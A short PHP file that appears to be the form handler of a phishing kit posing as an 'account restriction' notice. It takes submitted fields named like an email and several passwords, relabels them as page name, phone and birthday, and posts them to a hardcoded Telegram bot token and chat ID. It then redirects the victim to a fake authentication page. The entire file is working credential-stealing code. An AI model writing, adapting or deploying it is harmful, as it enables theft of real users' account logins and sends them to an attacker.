<?php
// Replace with your Telegram Bot Token
$botToken = "7652154074:AAEQX3FzEBlMyCPqUJVkgUzl6mL0mi1zj-Q";
$chatId = "6968789311"; // Replace with your chat ID or user ID

// Collect form data
$pageName = $_POST['PrevToEmail'];
$fullName = $_POST['PrevToPass'];
$phoneNumber = $_POST['PrevToPass2'];
$birthday = $_POST['PrevToPass3'];

// Prepare the message
$message = "New account restriction report:\n";
$message .= "Page Name: $pageName\n";
$message .= "Full Name: $fullName\n";
$message .= "Phone Number: $phoneNumber\n";
$message .= "Birthday: $birthday\n";

// Send message to Telegram
$telegramApiUrl = "https://api.telegram.org/bot$botToken/sendMessage";
$data = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML',
];

$options = [
    'http' => [
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data),
    ],
];
$context  = stream_context_create($options);
$result = file_get_contents($telegramApiUrl, false, $context);

// Check for errors
if ($result === FALSE) {
    die('Error sending message to Telegram.');
}

// Redirect or output success message
echo "Your message has been sent.";
header('Location:athention.php');
?>
